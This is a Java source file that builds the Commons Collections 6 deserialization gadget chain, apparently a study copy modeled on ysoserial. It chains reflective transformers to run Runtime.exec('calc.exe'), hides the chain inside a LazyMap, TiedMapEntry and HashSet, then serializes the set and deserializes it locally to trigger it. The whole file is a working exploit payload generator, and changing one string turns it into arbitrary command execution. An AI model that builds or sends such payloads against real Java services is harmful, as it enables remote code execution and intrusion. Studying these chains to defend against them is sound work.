package org.example.gadget.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class YsoCC6 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException {
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new
                        Object[] { "getRuntime",

                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new
                        Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "calc.exe" }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(lazyMap, "foo");

        HashSet hashSet = new HashSet();
        hashSet.add(tme);
        lazyMap.remove("foo");

        Field f =
                ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);


//        Field f =null;
//        try {
//            f = HashSet.class.getDeclaredField("map");
//        } catch (NoSuchFieldException e) {
//            f = HashSet.class.getDeclaredField("backingMap");
//        }
//        f.setAccessible(true);
//
//
//        HashMap innimpl = (HashMap) f.get(map);
//
//        Field f2 = null;
//        try {
//            f2 = HashMap.class.getDeclaredField("table");
//        } catch (NoSuchFieldException e) {
//            f2 = HashMap.class.getDeclaredField("elementData");
//        }
//        f2.setAccessible(true);
//
//        Object[] array = (Object[]) f2.get(innimpl);
//        Object node = array[0];
//        if(node == null){
//            node = array[1];
//        }
//
//        Field keyField = null;
//        try{
//            keyField = node.getClass().getDeclaredField("key");
//        }catch(Exception e){
//            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
//        }
//
//        keyField.setAccessible(true);
//        keyField.set(node, tme);

        // ==================
        // ⽣成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashSet);
        oos.close();
        // 本地测试触发
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();

    }
}
